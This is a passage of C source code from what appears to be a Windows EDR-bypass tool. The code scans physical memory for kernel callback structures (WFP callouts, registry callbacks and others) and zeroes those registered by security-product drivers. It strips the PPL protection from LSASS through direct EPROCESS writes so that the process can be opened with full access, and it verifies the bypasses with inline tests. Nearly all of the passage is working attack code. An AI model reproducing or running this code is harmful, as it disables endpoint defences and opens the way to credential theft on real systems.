    /* Guard 1: classifyFn in a DRV_OTHER driver, RVA sane.
     * DRV_SYSTEM/NETWORK/VM drivers either have their own WFP callouts that
     * are legitimate (skip) or produce false positives (also skip). */
    uint64_t cl_rva=0;
    const char *cl_drv=va_to_driver_ex(classify,&cl_rva);
    if(!cl_drv||!cl_rva||cl_rva>=MAX_SANE_RVA) return 0;
    if(is_wfp_system_driver(cl_drv)) return 0;
    if(classify_driver(cl_drv)!=DRV_OTHER) return 0;
    /* Skip our own driver and other known non-EDR no-version-info stubs */
    if(_strnicmp(cl_drv,"AMDRyzen",8)==0||_strnicmp(cl_drv,"dump_",5)==0||
       _strnicmp(cl_drv,"vm3d",4)==0||_strnicmp(cl_drv,"Basic",5)==0) return 0;

    /* Guard 2: notifyFn in same driver or NULL */
    if(notify){
        uint64_t nf_rva=0;
        const char *nf_drv=va_to_driver_ex(notify,&nf_rva);
        if(!nf_drv||strcmp(nf_drv,cl_drv)||!nf_rva||nf_rva>=MAX_SANE_RVA) return 0;
    }

    /* Guard 3: GUID.Data1 at off-0x18 must be non-zero */
    uint32_t guid_data1=*(uint32_t*)(g_chunk+off-0x18);
    if(!guid_data1) return 0;

    /* Guard 4: calloutId at off-0x04 — must be non-zero.
     * FWP assigns IDs sequentially; on busy systems (many drivers loading before
     * the EDR) the ID can exceed 0xFFFF, so we only reject zero. */
    uint32_t callout_id=*(uint32_t*)(g_chunk+off-0x04);
    if(!callout_id) return 0;

    /* Guard 5: LIST_ENTRY Flink/Blink are kernel pool VAs */
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x28), bl=*(uint64_t*)(g_chunk+off-0x20);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;

    /* Guard 6: flowDeleteFn at off+0x10 must be NULL or in same driver.
     * WdFilter minifilter pool nodes often have random pointers here. */
    if(off+0x18>csz) return 0;
    uint64_t fdn=*(uint64_t*)(g_chunk+off+0x10);
    if(fdn){
        uint64_t fdr=0;
        const char *fdd=va_to_driver_ex(fdn,&fdr);
        if(!fdd||strcmp(fdd,cl_drv)||!fdr||fdr>=MAX_SANE_RVA) return 0;
    }

    /* Guard 7: context at off+0x18 must be NULL or a kernel VA (not a small int) */
    uint64_t ctx=*(uint64_t*)(g_chunk+off+0x18);
    if(ctx&&(ctx>>48)!=0xFFFFULL) return 0;

    /* Dedup */
    uint64_t cl_pa=cpa+off;
    for(int i=0;i<g_wfp_n;i++) if(g_wfp[i].classify_pa==cl_pa) return 0;
    if(g_wfp_n>=WFP_MAX) return 0;

    WfpEntry *e=&g_wfp[g_wfp_n++];
    e->struct_pa  = cpa+off-0x28;
    e->classify_pa= cl_pa;
    e->notify_pa  = cl_pa+0x08;
    e->classify_va= classify;
    e->notify_va  = notify;
    strncpy(e->drv,cl_drv,63); e->drv[63]='\0'; e->zeroed=0;
    return 1;
}
static void wfp_scan(void)
{
    g_wfp_n=0; uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(g_wfp_n>=WFP_MAX) goto wfp_done;
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB] wfp=%d\r",(unsigned long long)(cpa>>20),g_wfp_n);fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x18<=csz&&g_wfp_n<WFP_MAX;off+=8)
                wfp_try(cpa,off,csz);
        }
    }
wfp_done:;
}
static int wfp_apply_edr(void)
{
    int ok=0; uint64_t z=0;
    for(int i=0;i<g_wfp_n;i++){
        WfpEntry *e=&g_wfp[i];
        if(!is_edr_target(e->drv)) continue;
        phys_read(e->classify_pa,e->orig_cl,8); phys_read(e->notify_pa,e->orig_nf,8);
        int a=phys_write(e->classify_pa,&z,8);
        int b=e->notify_va?phys_write(e->notify_pa,&z,8):1;
        if(a&&b){e->zeroed=1;ok++;}
    }
    return ok;
}
static void wfp_restore(void)
{
    for(int i=0;i<g_wfp_n;i++){
        WfpEntry *e=&g_wfp[i]; if(!e->zeroed) continue;
        uint64_t cur=0;
        if(phys_read(e->classify_pa,&cur,8)&&cur==0) phys_write(e->classify_pa,e->orig_cl,8);
        if(e->notify_va){cur=0;if(phys_read(e->notify_pa,&cur,8)&&cur==0) phys_write(e->notify_pa,e->orig_nf,8);}
        e->zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  MODULE: CM REGISTER CALLBACKS
 *
 * Two scan modes:
 *   Mode A (with altitude): CmRegisterCallbackEx entries — have UNICODE_STRING
 *   Mode B (no altitude):   CmRegisterCallback  entries — no altitude string
 *                           (Huorong, older products, boot-time drivers)
 * ══════════════════════════════════════════════════════════════════════ */

#define CM_MAX 256
typedef struct{
    uint64_t struct_pa,func_pa,func_va,cookie,drv_ptr;
    char drv[64]; uint8_t orig[8]; int zeroed;
    int has_altitude;
}CmEntry;
static CmEntry g_cm[CM_MAX]; static int g_cm_n=0;

static int cm_try(uint64_t cpa, uint64_t off, uint64_t csz, uint8_t anc)
{
    if(off<(uint64_t)anc||off+0x18>csz) return 0;
    uint64_t func=*(uint64_t*)(g_chunk+off); uint64_t fr=0;
    const char *fd=va_to_driver_ex(func,&fr); if(!fd||!fr||fr>=MAX_SANE_RVA) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-(uint64_t)anc),bl=*(uint64_t*)(g_chunk+off-(uint64_t)anc+8);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;
    uint16_t al=*(uint16_t*)(g_chunk+off-(uint64_t)anc+0x10), am=*(uint16_t*)(g_chunk+off-(uint64_t)anc+0x12);
    if(al<2||al>40||al&1||am!=al+2) return 0;
    uint64_t ab=*(uint64_t*)(g_chunk+off-(uint64_t)anc+0x18); if((ab>>48)!=0xFFFFULL) return 0;
    if(anc==0x28){uint64_t ctx=*(uint64_t*)(g_chunk+off-8);if(ctx&&(ctx>>48)!=0xFFFFULL) return 0;}
    uint64_t cookie=*(uint64_t*)(g_chunk+off+8); if(!cookie) return 0;
    uint64_t dp=*(uint64_t*)(g_chunk+off+0x10); if((dp>>48)!=0xFFFFULL||dp&7||va_in_any_module(dp)) return 0;
    uint64_t fpa=cpa+off;
    for(int i=0;i<g_cm_n;i++) if(g_cm[i].func_pa==fpa) return 0;
    if(g_cm_n>=CM_MAX) return 0;
    CmEntry *e=&g_cm[g_cm_n++];
    e->struct_pa=cpa+off-(uint64_t)anc; e->func_pa=fpa; e->func_va=func; e->cookie=cookie; e->drv_ptr=dp;
    strncpy(e->drv,fd,63); e->drv[63]='\0'; e->zeroed=0; e->has_altitude=1;
    return 1;
}

/*
 * cm_try_noalt — Mode B: CmRegisterCallback (no altitude string).
 * Used by Huorong and other products that call the legacy API.
 *
 * Reduced guards (no altitude UNICODE_STRING check):
 *   1. Function in known driver, RVA < 4MB
 *   2. Flink/Blink: kernel pool VAs, not in any module, 8-aligned
 *   3. Cookie (off+0x08): non-zero 64-bit
 *   4. Driver (off+0x10): kernel pool VA, not in any module, 8-aligned
 *   5. Context (off-0x08 for anc=0x28): NULL or kernel VA
 *   6. NOT duplicate of an already-found entry
 *
 * Layout assumed (CmRegisterCallback, no altitude):
 *   struct start = off - anc
 *   off-0x28 (anc=0x28): Flink
 *   off-0x20: Blink
 *   off-0x18..off-0x09: varies (context, no altitude string)
 *   off-0x08: Context
 *   off+0x00: Function ← anchor
 *   off+0x08: Cookie
 *   off+0x10: Driver
 *
 * Extra guard: the altitude location (off-0x18+0x10 = off-0x08 from anchor
 * for anc=0x28) should NOT look like a valid altitude (Length 2-40 even).
 * This prevents duplicating entries already found by cm_try.
 */
static int cm_try_noalt(uint64_t cpa, uint64_t off, uint64_t csz, uint8_t anc)
{
    if(off<(uint64_t)anc||off+0x18>csz) return 0;
    uint64_t func=*(uint64_t*)(g_chunk+off); uint64_t fr=0;
    const char *fd=va_to_driver_ex(func,&fr); if(!fd||!fr||fr>=MAX_SANE_RVA) return 0;

    uint64_t fl=*(uint64_t*)(g_chunk+off-(uint64_t)anc);
    uint64_t bl=*(uint64_t*)(g_chunk+off-(uint64_t)anc+8);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;

    /* Guard: altitude slot must NOT look like a valid altitude (to avoid
     * duplicating what cm_try already found with altitude check) */
    if(anc==0x28){
        uint16_t al=*(uint16_t*)(g_chunk+off-0x18);
        uint16_t am=*(uint16_t*)(g_chunk+off-0x16);
        if(al>=2&&al<=40&&(al&1)==0&&am==al+2){
            uint64_t ab=*(uint64_t*)(g_chunk+off-0x10);
            if((ab>>48)==0xFFFFULL) return 0; /* looks like altitude → skip, cm_try handles it */
        }
        uint64_t ctx=*(uint64_t*)(g_chunk+off-0x08);
        if(ctx&&(ctx>>48)!=0xFFFFULL) return 0;
    }

    uint64_t cookie=*(uint64_t*)(g_chunk+off+0x08); if(!cookie) return 0;
    uint64_t dp=*(uint64_t*)(g_chunk+off+0x10);
    if((dp>>48)!=0xFFFFULL||dp&7||va_in_any_module(dp)) return 0;

    uint64_t fpa=cpa+off;
    for(int i=0;i<g_cm_n;i++) if(g_cm[i].func_pa==fpa) return 0;
    if(g_cm_n>=CM_MAX) return 0;

    CmEntry *e=&g_cm[g_cm_n++];
    e->struct_pa=cpa+off-(uint64_t)anc; e->func_pa=fpa; e->func_va=func;
    e->cookie=cookie; e->drv_ptr=dp;
    strncpy(e->drv,fd,63); e->drv[63]='\0'; e->zeroed=0; e->has_altitude=0;
    return 1;
}

static void cm_scan(void)
{
    g_cm_n=0; uint64_t lp=0; const uint8_t ancs[2]={0x28,0x20};
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(g_cm_n>=CM_MAX) goto cm_done;
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB] cm=%d\r",(unsigned long long)(cpa>>20),g_cm_n);fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x18<=csz&&g_cm_n<CM_MAX;off+=8){
                /* Mode A first (with altitude — higher confidence) */
                int hit=0;
                for(int ai=0;ai<2&&!hit;ai++) hit=cm_try(cpa,off,csz,ancs[ai]);
                /* Mode B (no altitude — catches Huorong etc.) */
                if(!hit) for(int ai=0;ai<2&&!hit;ai++) hit=cm_try_noalt(cpa,off,csz,ancs[ai]);
            }
        }
    }
cm_done:;
}
static int cm_apply_edr(void)
{
    int ok=0; uint64_t z=0;
    for(int i=0;i<g_cm_n;i++){
        CmEntry *e=&g_cm[i];
        if(!is_edr_target(e->drv)) continue;
        phys_read(e->func_pa,e->orig,8);
        if(phys_write(e->func_pa,&z,8)){e->zeroed=1;ok++;}
    }
    return ok;
}
static void cm_restore(void)
{
    for(int i=0;i<g_cm_n;i++){
        CmEntry *e=&g_cm[i]; if(!e->zeroed) continue;
        uint64_t cur=0;
        if(phys_read(e->func_pa,&cur,8)&&cur==0) phys_write(e->func_pa,e->orig,8);
        e->zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §8c  MODULE: PPL BYPASS (EPROCESS.Protection)
 *
 * Clear EPROCESS.Protection of LSASS so OpenProcess(PROCESS_ALL_ACCESS)
 * succeeds when combined with OB callbacks being zeroed.
 *
 * NO self-elevation: writing to our own EPROCESS at a potentially wrong
 * offset causes BSOD.  Clearing LSASS.Protection alone is sufficient
 * when OB callbacks are already disabled.
 *
 * Offset detection: uses NtQIP(ProcessProtectionInformation=61) as the
 * ground truth for the actual Protection value, then byte-scans the
 * physical EPROCESS to locate the exact offset — handles builds where
 * Protection moved (e.g. 24H2→25H2 layout change).
 * ══════════════════════════════════════════════════════════════════════ */

#define EP_OFF_PID   0x440u
#define EP_OFF_FLINK 0x448u
#define EP_OFF_BLINK 0x450u
#define EP_OFF_TOKEN 0x4B8u
#define EP_OFF_NAME  0x5A8u
#define EP_READ_SZ   0x5C0u

static uint32_t g_ep_off_prot    = 0x87A;
static uint8_t  g_lsass_prot_api = 0;    /* NtQIP-reported protection (ground truth) */
static uint32_t g_lsass_pid      = 0;    /* saved for inline tests */
static uint64_t g_lsass_eproc_va = 0;    /* kernel VA of LSASS EPROCESS (from page-table walk) */

typedef struct { uint64_t pa; uint8_t prot_orig; uint8_t valid; } EprocInfo;
static EprocInfo g_lsass_ep  = {0,0,0};
static uint8_t   g_ppl_applied = 0;

static void ppl_detect_offsets(void)
{
    typedef LONG (WINAPI *pfnRtlGetVersion)(OSVERSIONINFOW*);
    OSVERSIONINFOW ov = {sizeof ov};
    pfnRtlGetVersion fn = (pfnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (fn) fn(&ov);
    g_ep_off_prot = (ov.dwBuildNumber >= 26100) ? 0x4FA : 0x87A;
    printf("    build %lu → OFF_PROT=0x%X (initial guess)\n",
           (unsigned long)ov.dwBuildNumber, g_ep_off_prot);
}

static uint32_t get_pid_by_name(const char *name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof pe};
    uint32_t found = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { found = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return found;
}

/* NtQIP class 61 = ProcessProtectionInformation → PS_PROTECTION byte */
static uint8_t ppl_get_prot_api(uint32_t pid)
{
    typedef NTSTATUS (NTAPI *PFN)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    PFN fn = (PFN)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                  "NtQueryInformationProcess");
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    uint8_t prot = 0;
    if (h && fn) fn(h, 61, &prot, 1, NULL);
    if (h) CloseHandle(h);
    return prot;
}

/* Same as ppl_get_prot_api but uses the globally saved g_lsass_pid.
 * Used in write-diagnostic loops where the pid is already known. */
static uint8_t ppl_ntqip_now(void)
{
    return ppl_get_prot_api(g_lsass_pid);
}

/* Walk the kernel's ActiveProcessLinks list (PsInitialSystemProcess → LSASS)
 * to find the live EPROCESS virtual address.  More reliable than physical scan
 * because it follows the same pointers the kernel uses. */
static uint64_t ppl_find_eproc_va(uint32_t lsass_pid,
                                    const uint8_t *pe, DWORD pe_sz, uint64_t nt_va)
{
    if (!g_kernel_cr3 || !pe || !pe_sz || !nt_va) return 0;

    /* PsInitialSystemProcess: ntoskrnl export whose value is a pointer to
     * the System EPROCESS.  Find it via disk-PE export table. */
    uint32_t rva = pe_export_rva(pe, pe_sz, "PsInitialSystemProcess");
    if (!rva) return 0;

    uint64_t var_va = nt_va + rva;
    uint64_t var_pa = va_to_pa(var_va);
    if (!var_pa) return 0;

    uint64_t sys_eproc_va = 0;
    if (!phys_read(var_pa, &sys_eproc_va, 8) || !sys_eproc_va) return 0;

    /* Traverse ActiveProcessLinks (doubly-linked list embedded in EPROCESS) */
    uint64_t list_head_va = sys_eproc_va + EP_OFF_FLINK;
    uint64_t curr_flink_va = 0;
    {
        uint64_t p = va_to_pa(list_head_va);
        if (!p || !phys_read(p, &curr_flink_va, 8)) return 0;
    }

    for (int limit = 4096; limit-- && curr_flink_va && curr_flink_va != list_head_va;) {
        uint64_t eproc_va = curr_flink_va - EP_OFF_FLINK;
        uint64_t pid_pa   = va_to_pa(eproc_va + EP_OFF_PID);
        if (pid_pa) {
            uint64_t pid = 0;
            phys_read(pid_pa, &pid, 8);
            if ((uint32_t)pid == lsass_pid) return eproc_va;
        }
        uint64_t next_pa = va_to_pa(curr_flink_va);
        if (!next_pa || !phys_read(next_pa, &curr_flink_va, 8)) break;
    }
    return 0;
}

/* Find the correct EPROCESS.Protection offset using NtQIP as ground truth.
 * For each candidate: write 0, evict ALL cores, query NtQIP.
 * If NtQIP returns 0 → this is the correct offset and write reached kernel.
 * Uses va_to_pa for field PA when EPROCESS VA is known (more precise). */
static uint32_t ppl_probe_offset_write_test(void)
{
    if (!g_lsass_prot_api) return 0;  /* not PPL, no need */

    static const uint32_t cands[] = {
        0x4FA, 0x87A, 0x6B0, 0x878, 0x880, 0x6FA, 0x7FA, 0x5FA, 0x4F8, 0
    };

    for (int ci = 0; cands[ci]; ci++) {
        uint32_t off = cands[ci];

        /* Get field PA: prefer VA-based (live kernel mapping) */
        uint64_t field_pa = 0;
        if (g_lsass_eproc_va) {
            field_pa = va_to_pa(g_lsass_eproc_va + off);
        }
        if (!field_pa || !pa_in_range(field_pa, 1)) {
            if (g_lsass_ep.pa) field_pa = g_lsass_ep.pa + off;
        }
        if (!field_pa || !pa_in_range(field_pa, 1)) continue;

        uint8_t orig = 0;
        phys_read(field_pa, &orig, 1);

        uint8_t z = 0;
        phys_write(field_pa, &z, 1);
        cache_evict_all_cores();

        uint8_t post = ppl_ntqip_now();
        phys_write(field_pa, &orig, 1);  /* restore immediately */

        printf("    probe 0x%03X PA=0x%llX → NtQIP=0x%02X %s\n",
               off, (unsigned long long)field_pa, post,
               post==0 ? "✓ CONFIRMED" : "");

        if (post == 0) {
            g_ep_off_prot = off;
            g_lsass_ep.prot_orig = orig ? orig : g_lsass_prot_api;
            /* Update PA to the live field page (correct base) */
            if (g_lsass_eproc_va) {
                uint64_t base_pa = va_to_pa(g_lsass_eproc_va);
                if (base_pa) g_lsass_ep.pa = base_pa;
            }
            return off;
        }
    }
    return 0;
}

static void ppl_scan(uint32_t lsass_pid,
                     const uint8_t *pe, DWORD pe_sz, uint64_t nt_va)
{
    /* Step 1: find LSASS EPROCESS via kernel page-table walk (live, authoritative) */
    printf("    [kernel list walk] ");
    uint64_t eproc_va = ppl_find_eproc_va(lsass_pid, pe, pe_sz, nt_va);
    if (eproc_va) {
        g_lsass_eproc_va = eproc_va;
        uint64_t base_pa = va_to_pa(eproc_va);
        printf("EPROCESS VA=0x%llX  PA=0x%llX\n",
               (unsigned long long)eproc_va, (unsigned long long)base_pa);
        if (base_pa) {
            g_lsass_ep.pa = base_pa;
            g_lsass_ep.valid = 1;
        }
    } else {
        printf("not available (g_kernel_cr3=%s)\n", g_kernel_cr3 ? "ok" : "missing");
    }

    /* Step 2: physical scan as fallback (also sets g_lsass_ep.pa if step 1 failed) */
    if (!g_lsass_ep.valid) {
        static uint8_t ep[EP_READ_SZ];
        uint64_t last_prog = 0;

        for (int ri = 0; ri < g_nranges && !g_lsass_ep.valid; ri++) {
            uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
            for (uint64_t cpa = g_ranges[ri].base; cpa < end && !g_lsass_ep.valid; cpa += CHUNK_SZ) {
                if (cpa - last_prog >= 0x40000000ULL) {
                    printf("  [%5lluMB] lsass=--\r", (unsigned long long)(cpa>>20));
                    fflush(stdout); last_prog = cpa;
                }
                uint64_t csz = end-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
                if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;
                for (uint64_t off = EP_OFF_NAME; off+8 <= csz; off += 8) {
                    uint8_t c = g_chunk[off];
                    if (c<'A'||c>'z'||c=='['||c=='\\'||c==']'||c=='^'||c=='`') continue;
                    uint64_t epa = (cpa+off)-EP_OFF_NAME;
                    if (!pa_in_range(epa, EP_READ_SZ)) continue;
                    if (epa>=cpa && epa+EP_READ_SZ<=cpa+csz) memcpy(ep,g_chunk+(epa-cpa),EP_READ_SZ);
                    else if (!phys_read(epa,ep,EP_READ_SZ)) continue;
                    uint64_t pid=*(uint64_t*)(ep+EP_OFF_PID);
                    if (!pid||pid>0xFFFF) continue;
                    if (memcmp(ep+EP_OFF_NAME,g_chunk+off,4)) continue;
                    int ok=1; for(int k=0;k<15;k++){uint8_t nc=ep[EP_OFF_NAME+k];if(!nc)break;if(nc<0x20||nc>0x7E){ok=0;break;}}
                    if (!ok) continue;
                    uint64_t token=*(uint64_t*)(ep+EP_OFF_TOKEN),flink=*(uint64_t*)(ep+EP_OFF_FLINK),blink=*(uint64_t*)(ep+EP_OFF_BLINK);
                    if((token&~0xFULL)<0xFFFF800000000000ULL) continue;
                    if(flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL) continue;
                    if ((uint32_t)pid==lsass_pid) {
                        char nm[16]={0}; memcpy(nm,ep+EP_OFF_NAME,15);
                        printf("\n  [LSASS phys-scan] PA=0x%016llX  pid=%u  %s\n",
                               (unsigned long long)epa,(uint32_t)pid,nm);
                        g_lsass_ep.pa=epa; g_lsass_ep.valid=1;
                    }
                }
            }
        }
    }

    if (!g_lsass_ep.valid) return;

    /* Step 3: get live protection value + find correct offset via write test */
    g_lsass_prot_api = ppl_get_prot_api(lsass_pid);
    printf("    NtQIP(Protection)=0x%02X\n", g_lsass_prot_api);

    if (g_lsass_prot_api) {
        printf("    Probing Protection offset (write-test per candidate):\n");
        uint32_t confirmed = ppl_probe_offset_write_test();
        if (confirmed)
            printf("    Protection offset CONFIRMED: 0x%X  prot_orig=0x%02X\n",
                   g_ep_off_prot, g_lsass_ep.prot_orig);
        else
            printf("    [!] No offset confirmed — PPL bypass may fail\n");
    } else {
        g_lsass_ep.prot_orig = 0;
    }
}

/* Write diagnostic: query NtQIP immediately after UC write.
 * If cache line cold → kernel fetches DRAM → returns 0 (LIVE).
 * If cache line hot  → kernel reads L3   → returns orig (STALE).
 * On STALE: retry with all-core eviction (up to 3 attempts). */
static int ppl_apply(void)
{
    if (!g_lsass_ep.valid) return 0;
    if (!g_lsass_prot_api) {
        g_ppl_applied = 1;
        return 1;
    }
    uint8_t zero = 0;
    int confirmed = 0;

    for (int attempt = 0; attempt < 3 && !confirmed; attempt++) {
        if (!phys_write(g_lsass_ep.pa + g_ep_off_prot, &zero, 1)) return 0;

        /* Check immediately (before cache eviction) */
        uint8_t post = ppl_ntqip_now();
        if (post == 0) {
            printf("    Write LIVE (attempt %d, pre-eviction)\n", attempt+1);
            confirmed = 1;
            break;
        }

        /* Cache line was hot — evict ALL cores and retry */
        printf("    Write STALE (NtQIP=0x%02X), evicting all cores (attempt %d)...\n",
               post, attempt+1);
        cache_evict_all_cores();

        post = ppl_ntqip_now();
        if (post == 0) {
            printf("    Write LIVE (post-eviction)\n");
            confirmed = 1;
            break;
        }
        printf("    Still STALE (NtQIP=0x%02X)\n", post);

        /* Restore before next attempt to avoid partial state */
        if (attempt < 2) phys_write(g_lsass_ep.pa + g_ep_off_prot,
                                    &g_lsass_ep.prot_orig, 1);
    }

    if (!confirmed) {
        printf("    [!] Write did not reach live kernel — PPL bypass skipped\n");
        phys_write(g_lsass_ep.pa + g_ep_off_prot, &g_lsass_ep.prot_orig, 1);
        return 0;
    }
    g_ppl_applied = 1;
    return 1;
}

static void ppl_restore(void)
{
    if (!g_ppl_applied) return;
    if (g_lsass_ep.valid && g_lsass_prot_api)
        phys_write(g_lsass_ep.pa + g_ep_off_prot, &g_lsass_ep.prot_orig, 1);
    g_ppl_applied = 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §COMBINED POOL SCAN  (defined here so all module try-functions are visible)
 *
 * Single pass over physical memory running OB + FLT + CM + WFP scanners.
 * Optimisations vs four separate full passes:
 *   • 4× fewer phys_read IOCTL calls (one chunk read serves all scanners)
 *   • kernel-VA pre-filter: byte[7]==0xFF check rejects ~95% of offsets
 *   • zero-chunk early-skip (unallocated pages)
 * ══════════════════════════════════════════════════════════════════════ */
static void combined_pool_scan(void)
{
    g_ob_n=0; g_flt_n_raw=0; g_cm_n=0; g_wfp_n=0;
    uint64_t lp=0;
    const uint8_t flt_ancs[3]={0x20,0x18,0x28};
    const uint8_t cm_ancs[2]={0x28,0x20};

    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){
                printf("  [%5lluMB] ob=%-4d flt=%-5d cm=%-4d wfp=%-4d\r",
                       (unsigned long long)(cpa>>20),g_ob_n,g_flt_n_raw,g_cm_n,g_wfp_n);
                fflush(stdout); lp=cpa;
            }
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            /* Zero-chunk skip: first 64 bytes all zero → unallocated, nothing to scan */
            {int nz=0;for(int zi=0;zi<64&&(uint64_t)zi<csz;zi+=8)if(*(uint64_t*)(g_chunk+zi)){nz=1;break;}if(!nz) continue;}

            int ob_full=(g_ob_n>=OB_MAX),     flt_full=(g_flt_n_raw>=FLT_MAX_RAW);
            int cm_full=(g_cm_n>=CM_MAX),      wfp_full=(g_wfp_n>=WFP_MAX);
            if(ob_full&&flt_full&&cm_full&&wfp_full) goto cps_done;

            for(uint64_t off=0x28;off+0x18<=csz;off+=8){
                /* Kernel-VA pre-filter: all try-functions require a kernel function
                 * pointer (bits 63:48 == 0xFFFF) at `off`.  One byte check eliminates
                 * ~95% of positions immediately without calling any try-function. */
                if(g_chunk[off+7]!=0xFF) continue;

                if(!ob_full){
                    if(!ob_try(cpa,off,csz)) ob_try_20(cpa,off,csz);
                    ob_full=(g_ob_n>=OB_MAX);
                }
                if(!flt_full&&off+0x10<=csz){
                    for(int ai=0;ai<3;ai++) if(flt_try(cpa,off,flt_ancs[ai],csz)) break;
                    flt_full=(g_flt_n_raw>=FLT_MAX_RAW);
                }
                if(!cm_full){
                    int hit=0;
                    for(int ai=0;ai<2&&!hit;ai++) hit=cm_try(cpa,off,csz,cm_ancs[ai]);
                    if(!hit) for(int ai=0;ai<2&&!hit;ai++) hit=cm_try_noalt(cpa,off,csz,cm_ancs[ai]);
                    cm_full=(g_cm_n>=CM_MAX);
                }
                if(!wfp_full&&off+0x20<=csz){
                    wfp_try(cpa,off,csz);
                    wfp_full=(g_wfp_n>=WFP_MAX);
                }
            }
        }
    }
cps_done:;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  RESTORE ALL + CTRL HANDLER
 * ══════════════════════════════════════════════════════════════════════ */

static volatile int g_anything_applied=0;

static void restore_all(void)
{
    if(!g_anything_applied) return;
    printf("\n[RESTORE] Restoring all...\n");
    ppl_restore();
    cm_restore();
    wfp_restore();
    etw_restore();
    flt_restore();
    ob_restore();
    for(int i=0;i<3;i++) ps_restore(&g_ps[i]);
    wk_restore();
    cache_evict_multiccd();
    g_anything_applied=0;
    printf("[RESTORE] Done.\n\n");
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||ev==CTRL_CLOSE_EVENT||
       ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_anything_applied){
            printf("\n[!] Emergency restore...\n"); fflush(stdout);
            restore_all(); fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

/* ══════════════════════════════════════════════════════════════════════
 * §9b  INLINE VERIFICATION TESTS
 *
 * Run immediately after all bypasses are applied, before restore.
 * No external process needed — minimises the bypass window.
 * ══════════════════════════════════════════════════════════════════════ */

#define IT_PASS(f,...) printf("  \033[32m[PASS]\033[0m " f "\n",##__VA_ARGS__)
#define IT_FAIL(f,...) printf("  \033[31m[FAIL]\033[0m " f "\n",##__VA_ARGS__)
#define IT_WARN(f,...) printf("  \033[33m[WARN]\033[0m " f "\n",##__VA_ARGS__)

static void it_ps(void)
{
    printf("\n[T1] Ps* Notify — spawn process, check EDR doesn't terminate it\n");
    STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi={0};
    if(CreateProcessA("C:\\Windows\\System32\\whoami.exe",NULL,
                      NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)){
        WaitForSingleObject(pi.hProcess,2000);
        DWORD ec=STILL_ACTIVE; GetExitCodeProcess(pi.hProcess,&ec);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        if(ec!=STILL_ACTIVE) IT_PASS("Process ran and exited — Ps* notify DISABLED");
        else                  IT_WARN("Process still running after 2s");
    } else IT_FAIL("CreateProcess err=%lu",GetLastError());
}

static HANDLE it_ob(DWORD lsass_pid)
{
    printf("\n[T2] OB + PPL — OpenProcess(LSASS, PROCESS_ALL_ACCESS)\n");
    printf("     LSASS PID=%lu  NtQIP_prot=0x%02X  OFF_PROT=0x%X\n",
           (unsigned long)lsass_pid, g_lsass_prot_api, g_ep_off_prot);

    /* Diagnostic: PROCESS_QUERY_LIMITED_INFORMATION is always allowed for PPL.
     * If this ALSO fails → something BELOW PPL is blocking (IRP hook, etc.) */
    HANDLE hq = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsass_pid);
    if (hq) {
        printf("     PROCESS_QUERY_LIMITED_INFORMATION: OK (PPL layer passed)\n");
        CloseHandle(hq);
    } else {
        DWORD eq = GetLastError();
        printf("     PROCESS_QUERY_LIMITED_INFORMATION: FAIL err=%lu "
               "→ IRP-level hook or device filter blocking ALL access\n", eq);
    }

